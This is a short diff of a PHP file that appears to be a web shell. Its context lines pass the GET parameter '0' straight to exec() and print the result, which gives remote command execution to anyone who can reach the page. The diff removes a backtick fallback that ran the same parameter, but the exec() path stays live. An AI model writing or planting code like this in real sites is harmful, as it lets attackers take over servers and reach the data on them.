@@ -11,8 +11,6 @@ if (isset($_GET['0'])) {
     } else if (function_exists("exec")) {
         $arr = exec($_GET['0']);
         print_r($arr);
-    } else if (!function_exists("system") && !function_exists("exec")) {
-        echo `$_GET[0]`;
     }
 }
 
